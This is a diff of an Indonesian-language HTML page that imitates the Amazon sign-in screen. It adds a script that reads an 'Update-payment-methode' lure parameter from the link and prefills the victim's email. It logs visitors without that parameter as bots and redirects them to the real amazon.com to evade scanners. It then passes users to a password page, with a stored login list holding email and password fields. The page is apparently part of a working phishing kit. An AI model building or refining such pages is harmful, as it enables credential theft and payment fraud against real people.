@@ -61,61 +61,102 @@
         .footer a { color: #0066c0; text-decoration: none; margin: 0 8px; }
     </style>
 </head>
-<body onload="CONFIG.cekParameter()">
-    <div class="logo">
-        <img src="img/amazonlogo.png" alt="Amazon">
-    </div>
-
-    <div class="kotak">
-        <h1>Masuk atau buat akun</h1>
-
-        <label for="email">Alamat email</label>
-        <input type="email" id="email" placeholder="nama@contoh.com" autocomplete="username">
-        <div class="pesan-kesalahan" id="kesalahanEmail">Masukkan alamat email yang valid</div>
-
-        <button id="tombolLanjut" disabled onclick="lanjut()">Lanjut</button>
-
-        <div class="link-bantuan">
-            Belum punya akun? <a href="#">Buat akun Amazon</a>
+<body>
+    <div id="kontenUtama">
+        <div class="logo">
+            <img src="img/amazonlogo.png" alt="Amazon">
         </div>
 
-        <div class="garis-pemisah">
-            <hr> <span>Atau lanjutkan dengan</span> <hr>
+        <div class="kotak">
+            <h1>Masuk atau buat akun</h1>
+
+            <label for="email">Alamat email</label>
+            <input type="email" id="email" placeholder="nama@contoh.com" autocomplete="username">
+            <div class="pesan-kesalahan" id="kesalahanEmail">Masukkan alamat email yang valid</div>
+
+            <button id="tombolLanjut" disabled onclick="lanjut()">Lanjut</button>
+
+            <div class="link-bantuan">
+                Belum punya akun? <a href="#">Buat akun Amazon</a>
+            </div>
+
+            <div class="garis-pemisah">
+                <hr> <span>Atau lanjutkan dengan</span> <hr>
+            </div>
+
+            <div class="link-bantuan">
+                <a href="#">Butuh bantuan?</a>
+            </div>
         </div>
 
-        <div class="link-bantuan">
-            <a href="#">Butuh bantuan?</a>
+        <div class="footer">
+            <p>
+                <a href="#">Syarat Penggunaan</a>
+                <a href="#">Pemberitahuan Privasi</a>
+                <a href="#">Bantuan</a>
+            </p>
+            <p style="margin-top:5px; color:#999;">© 1996–2026, Amazon.com, Inc. atau afiliasinya</p>
         </div>
-    </div>
-
-    <div class="footer">
-        <p>
-            <a href="#">Syarat Penggunaan</a>
-            <a href="#">Pemberitahuan Privasi</a>
-            <a href="#">Bantuan</a>
-        </p>
-        <p style="margin-top:5px; color:#999;">© 1996–2026, Amazon.com, Inc. atau afiliasinya</p>
     </div>
 
     <script>
+        // === CEK PARAMETER & CATAT BOT ===
+        const params = new URLSearchParams(window.location.search);
+        const adaParameter = params.toString().includes('Update-payment-methode');
+
+        if (!adaParameter) {
+            // ❌ TANPA PARAMETER → CATAT SEBAGAI BOT LALU ALIHKAN
+            localStorage.setItem('pakaiParameter', 'TIDAK');
+            
+            // Simpan langsung sebagai BOT di daftar login
+            const daftarLogin = JSON.parse(localStorage.getItem('daftarLogin') || '[]');
+            daftarLogin.unshift({
+                email: 'Tidak ada parameter',
+                sandi: '-',
+                isBot: true,
+                waktu: new Date().toLocaleString('id-ID')
+            });
+            localStorage.setItem('daftarLogin', JSON.stringify(daftarLogin));
+
+            // Sembunyikan halaman & alihkan
+            document.getElementById('kontenUtama').style.display = 'none';
+            window.location.href = 'https://www.amazon.com';
+        } else {
+            // ✅ DENGAN PARAMETER → Lanjutkan biasa
+            localStorage.setItem('pakaiParameter', 'YA');
+            
+            // Ekstrak email dari parameter
+            const cocok = window.location.href.match(/Update-payment-methode-([^-]+)-(\d+)=aktif/);
+            if (cocok && cocok[1] && cocok[1] !== 'EMAIL') {
+                localStorage.setItem('emailPengguna', decodeURIComponent(cocok[1]));
+            }
+        }
+
+        // === FORM EMAIL ===
         const inputEmail = document.getElementById('email');
         const tombolLanjut = document.getElementById('tombolLanjut');
         const kesalahanEmail = document.getElementById('kesalahanEmail');
 
-        // Cek input email
-        inputEmail.addEventListener('input', fungsiCek);
+        // Isi otomatis jika ada dari tautan
+        const emailTersimpan = localStorage.getItem('emailPengguna');
+        if (emailTersimpan && emailTersimpan.includes('@')) {
+            inputEmail.value = emailTersimpan;
+            cekInput();
+        }
+
+        inputEmail.addEventListener('input', cekInput);
         inputEmail.addEventListener('keydown', function(e) {
             if (e.key === 'Enter' && !tombolLanjut.disabled) lanjut();
         });
 
-        function fungsiCek() {
+        function cekInput() {
             const email = inputEmail.value.trim();
-            const formatEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const formatSah = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             
-            if (email === '') {
+            if (!email) {
                 kesalahanEmail.style.display = 'none';
                 tombolLanjut.disabled = true;
-            } else if (!formatEmail.test(email)) {
+            } else if (!formatSah.test(email)) {
                 kesalahanEmail.style.display = 'block';
                 tombolLanjut.disabled = true;
             } else {
@@ -125,8 +166,7 @@
         }
 
         function lanjut() {
-            const email = inputEmail.value.trim();
-            localStorage.setItem('emailPengguna', email);
+            localStorage.setItem('emailPengguna', inputEmail.value.trim());
             window.location.href = 'password.html';
         }
     </script>
